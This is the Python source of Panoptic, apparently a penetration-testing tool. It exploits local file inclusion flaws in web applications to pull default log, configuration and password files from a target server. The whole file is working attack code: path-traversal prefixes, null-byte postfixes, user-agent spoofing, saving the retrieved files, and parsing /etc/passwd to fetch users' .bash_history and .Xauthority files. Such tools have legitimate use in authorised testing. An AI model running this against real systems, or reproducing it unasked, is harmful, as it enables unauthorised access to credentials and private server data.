#!/usr/bin/env python

"""
Copyright (c) 2013 Roberto Christopher Salgado Bjerre, Miroslav Stampar.

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"),
to deal in the Software without restriction, including without limitation the
rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
sell copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

"""
Panoptic

Search default file locations through LFI vulnerability for common log and config files
"""

import difflib
import os
import random
import re
import string
import time
import xml.etree.ElementTree as ET

from urllib import urlencode
from urllib2 import build_opener, install_opener, urlopen, ProxyHandler, Request
from urlparse import urlsplit, parse_qsl
from optparse import OptionParser
from sys import exit

NAME = "Panoptic"
VERSION = "v0.1"
URL = "https://github.com/lightos/Panoptic/"

# Used for retrieving response for a dummy filename
INVALID_FILENAME = "".join(random.sample(string.letters, 10))

# Location of file containing test cases
CASES_FILE = "cases.xml"

# Location of file containing user agents
USER_AGENTS_FILE = "agents.txt"

# Used for heuristic comparison of responses
HEURISTIC_RATIO = 0.9

# ASCII eye taken from http://www.retrojunkie.com/asciiart/health/eyes.htm
BANNER = """
 .-',--.`-.
<_ | () | _>
  `-`=='-'

%s %s (%s)
""" % (NAME, VERSION, URL)

EXAMPLES = """
Examples:
./panoptic.py --url "http://localhost/lfi.php?file=test.txt"
./panoptic.py --url "http://localhost/lfi.php?file=test.txt&id=1" --param file
./panoptic.py --url "http://localhost/lfi.php" --data "file=test.txt&id=1" --param file

./panoptic.py --list software
./panoptic.py --list category
./panoptic.py --list os

./panoptic.py -u "http://localhost/lfi.php?file=test.txt" --os Windows
./panoptic.py -u "http://localhost/lfi.php?file=test.txt" --software WAMP
"""

def get_cases(args):
    """
    Parse XML and return testing cases filtered by provided args
    """

    tree = ET.parse(CASES_FILE)
    root = tree.getroot()

    def _(parent, element):
        element.parent = parent
        for key, value in element.attrib.items():
            setattr(element, key, value)
        for child in element.getchildren():
            _(element, child)

    _(None, root)

    for attr in ("os", "software", "category"):
        if getattr(args, attr):
            for element in root.iterfind(".//%s" % attr):
                if element.value.lower() != getattr(args, attr).lower():
                    element.parent.remove(element)

    if args.type:
        for _ in (_ for _ in ("conf", "log", "other") if _.lower() != args.type.lower()):
            for element in root.iterfind(".//%s" % _):
                element.parent.remove(element)

    def _(element, tag):
        while element.parent is not None:
            if element.parent.tag == tag:
                return element.parent
            else:
                element = element.parent

    cases = []
    replacements = {'HOST': urlsplit(args.url).netloc}

    for element in root.iterfind(".//file"):
        case = {}
        case["location"] = element.value
        case["os"] = _(element, "os").value
        case["category"] = _(element, "category").value
        case["software"] = _(element, "software").value
        case["type"] = _(element, "log") is not None and "log"\
                    or _(element, "conf") is not None and "conf"\
                    or _(element, "other") is not None and "other"

        for variable in re.findall(r"\{[^}]+\}", case["location"]):
            case["location"] = case["location"].replace(variable, replacements.get(variable.strip("{}"), variable))

        cases.append(case)

    return cases

def parse_args():
    """
    Parses command line arguments
    """

    OptionParser.format_epilog = lambda self, formatter: self.epilog  # Override epilog formatting

    parser = OptionParser(usage="usage: %prog --url TARGET [options]", epilog=EXAMPLES)

    # Required
    parser.add_option("-u", "--url", dest="url",
                help="set the target URL to test")
    # Optional
    parser.add_option("-p", "--param", dest="param",
                help="set parameter name to test for")

    parser.add_option("-d", "--data", dest="data",
                help="set data for POST request (e.g. \"page=default\")")

    parser.add_option("--proxy", dest="proxy",
                help="set proxy type and address (e.g. \"socks5://192.168.5.92\")")

    parser.add_option("--user-agent", dest="user_agent",
                help="set the HTTP User-Agent header value")

    parser.add_option("--random-agent", dest="random_agent", action="store_true",
                help="choose random HTTP User-Agent header value")

    parser.add_option("-o", "--os", dest="os",
                help="set operating system to limit searches to")

    parser.add_option("-s", "--software", dest="software",
                help="set name of the software to search for")

    parser.add_option("-c", "--category", dest="category",
                help="set specific category of software to look for")

    parser.add_option("-t", "--type", dest="type",
                help="set type of file to search for (\"conf\" or \"log\")")

    parser.add_option("-b", "--prefix", dest="prefix", default="",
                help="set prefix for file path (e.g. \"../\")")

    parser.add_option("-e", "--postfix", dest="postfix", default="",
                help="set postfix for file path (e.g. \"%00\")")

    parser.add_option("-m", "--multiplier", dest="multiplier", type="int", default=1,
                help="set number to multiply the prefix by (e.g. 10)")

    parser.add_option("-w", "--write-file", dest="write_file", action="store_true",
                help="write content of found files to output folder")

    parser.add_option("-x", "--skip-file-parsing", dest="skip_parsing", action="store_true",
                help="skip special tests if *NIX passwd file is found")
    
    parser.add_option("-r", "--replace-slash", dest="replace_slash",
                help="set replacement for forward slash in path (e.g. \"/././\")")

    parser.add_option("-l", "--list", dest="list",
                help="list available filters (\"os\", \"category\" or \"software\")")

    parser.add_option("-v", "--verbose", action="store_true", dest="verbose",
                help="display extra information in the output")

    args = parser.parse_args()[0]

    if not any((args.url, args.list)):
        parser.error('missing argument for target url. Use -h for help')

    if args.prefix:
        args.prefix = args.prefix * args.multiplier

    return args

def main():
    """
    Initializes and executes the program
    """

    print(BANNER)

    args = parse_args()
    found = False
    kb = {}
    files = []

    cases = get_cases(args)

    if args.list:
        print("[i] Listing available filters for usage with option '--%s':\n" % args.list)

        for _ in set([_[args.list] for _ in cases]):
            print _ if re.search(r"\A[A-Za-z0-9]+\Z", _) else '"%s"' % _

        exit()

    if args.proxy:
        import thirdparty.socks.socks

        match = re.search(r"(?P<type>[^:]+)://(?P<address>[^:]+):(?P<port>\d+)", args.proxy, re.I)

        if match:
            if match.group("type").lower() == "socks4":
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, match.group("address"), int(match.group("port")), True)
            elif match.group("type").lower() == "socks5":
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, match.group("address"), int(match.group("port")), True)
            elif match.group("type").lower() in ("http", "https"):
                _ = ProxyHandler({match.group("type"): args.proxy})
                opener = build_opener(_)
                install_opener(opener)

    if args.random_agent:
        with open(USER_AGENTS_FILE, 'r') as f:
            args.user_agent = random.sample(f.readlines(), 1)[0]

    print("[i] Starting scan at: %s\n" % time.strftime("%X"))

    parsed_url = urlsplit(args.url)
    request_params = args.data if args.data else parsed_url.query

    if not args.param:
        args.param = re.match("(?P<param>[^=&]+)={1}(?P<value>[^=&]+)", request_params).group(1)

    def prepare_request(payload):
        """
        Prepares HTTP (GET or POST) request with proper payload
        """

        _ = re.sub(r"(?P<param>%s)={1}(?P<value>[^=&]+)" % args.param,
                                r"\1=%s" % payload, request_params)

        request_args = {"url": "%s://%s%s" % (parsed_url.scheme or "http", parsed_url.netloc, parsed_url.path)}

        if args.data:
            request_args["data"] = _
        else:
            request_args["url"] += "?%s" % _

        if args.user_agent:
            request_args["user_agent"] = args.user_agent

        request_args["verbose"] = args.verbose

        return request_args

    def clean_response(response, filepath):
        """
        Cleans response from occurrences of filepath
        """

        response = response.replace(filepath, "")
        regex = re.sub(r"[^A-Za-z0-9]", "(.|&\w+;|%[0-9A-Fa-f]{2})", filepath)

        return re.sub(regex, "", response, re.I)

    print("[*] Checking invalid response...")

    request_args = prepare_request(INVALID_FILENAME)
    invalid_response, _ = get_page(**request_args)

    print("[*] Done!\n")
    print("[*] Searching for files...")

    def request_file(case):
        """
        Request file from URL
        """
        if args.replace_slash:
            case["location"] = case["location"].replace("/", args.replace_slash.replace("\\", "\\\\"))

        if kb.get("restrictOS") and kb.get("restrictOS") != case["os"]:
            if args.verbose:
                print("[o] Skipping '%s'" % case["location"])

            return None

        if args.prefix and args.prefix[len(args.prefix) - 1] == "/":
            args.prefix = args.prefix[:-1]

        if args.verbose:
            print("[o] Trying '%s'" % case["location"])

        request_args = prepare_request("%s%s%s" % (args.prefix, case["location"], args.postfix))
        html, _ = get_page(**request_args)

        if not html:
            return None

        matcher = difflib.SequenceMatcher(None, clean_response(html, case["location"]), clean_response(invalid_response, INVALID_FILENAME))

        if matcher.quick_ratio() < HEURISTIC_RATIO:
            if not found:
                print("[*] Possible file(s) found!\n")
                print("[*] OS: %s\n" % case["os"])

                if kb.get("restrictOS") is None:
                    _ = raw_input("[?] Do you want to restrict further scans to '%s'? [Y/n] " % case["os"])
                    print
                    kb["restrictOS"] = _.lower() != 'n' and case["os"]

            print("[+] Found '%s' (%s/%s/%s)" % (case["location"], case["os"], case["category"], case["type"]))

            if args.verbose:
                files.append("'%s' (%s/%s/%s)" % (case["location"], case["os"], case["category"], case["type"]))

            # If --write-file is set
            if args.write_file:
                _ = os.path.join("output", parsed_url.netloc)
                if not os.path.exists(_):
                    os.makedirs(_)
                with open(os.path.join(_, "%s.txt" % case["location"].replace(args.replace_slash if args.replace_slash else "/", "_")), "w") as f:
                    f.write(html)
            return html
        return None

    # Test file locations in XML file
    for case in cases:
        html = request_file(case)

        if html is None:
            continue
        if not found:
            found = True

        # If --skip-file-parsing is not set.
        if case["location"] in ("/etc/passwd", "/etc/security/passwd") and not args.skip_parsing:
            users = re.findall("(?P<username>[^:\n]+):(?P<password>[^:]*):(?P<uid>\d+):(?P<gid>\d*):(?P<info>[^:]*):(?P<home>[^:]+):[/a-z]*", html)

            print("\n[i] Extracting home folders from '%s'" % case["location"])

            for user in users:
                if args.verbose:
                    print("[o] User: %s, Info: %s" % (user[0], user[4]))
                for _ in (".bash_config", ".bash_history", ".bash_logout", ".ksh_history", ".Xauthority"):
                    if user[5] == "/": # Will later add a constraint to only check root folder "/" once.
                        continue
                    request_file({"category": "*NIX Password File", "type": "conf", "os": case["os"], "location": "%s/%s" % (user[5], _), "software": "*NIX"})

    if not found:
        print("[*] No files found!")
    elif args.verbose:
        print "\n[i] Files found:"
        for _ in files:
            print "[+] %s" % _

    print("\n[*] File search complete.")
    print("\n[i] Finishing scan at: %s\n" % time.strftime("%X"))

def get_page(**kwargs):
    """
    Retrieves page content from a given target URL
    """

    url = kwargs.get("url", None)
    post = kwargs.get("data", None)
    header = kwargs.get("header", None)
    cookie = kwargs.get("cookie", None)
    user_agent = kwargs.get("user_agent", None)
    verbose = kwargs.get("verbose", False)

    headers = {}
    parsed_url = None
    page = None

    if url is None:
        raise Exception("[!] URL cannot be None.")

    try:
        parsed_url = urlsplit(url)
    except:
        raise Exception("[!] Unable to parse URL: %s" % url)

    if user_agent is None:
        user_agent = "%s %s" % (NAME, VERSION)

    if post is None:
        url = "%s://%s%s?%s" % (parsed_url.scheme or "http", parsed_url.netloc, parsed_url.path,
                                urlencode(parse_qsl(parsed_url.query)))
    else:
        post = urlencode(parse_qsl(post), "POST")

    # Perform HTTP Request
    try:
        headers["User-agent"] = user_agent
        headers["Accept"] = "*"  # Set option to add headers in cmdline

        req = Request(url, post, headers)
        conn = urlopen(req)

        # Get HTTP Response
        page = conn.read()
        code = conn.code
        status = conn.msg
        responseHeaders = conn.info()

    except KeyboardInterrupt:
        raise

    except Exception, e:
        if verbose:
            if getattr(e, "msg", None):
                print("[!] Error msg '%s'" % e.msg)
            if getattr(e, "reason", None):
                print("[!] Error reason '%s'" % e.reason)
            if getattr(e, "message", None):
                print("[!] Error message '%s'" % e.message)
            if getattr(e, "code", None):
                print("[!] HTTP error code '%d'" % e.code)
            if getattr(e, "info", None):
                print("[!] Response headers '%s'" % e.info())

    return page, parsed_url

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print "[x] Ctrl-C pressed"
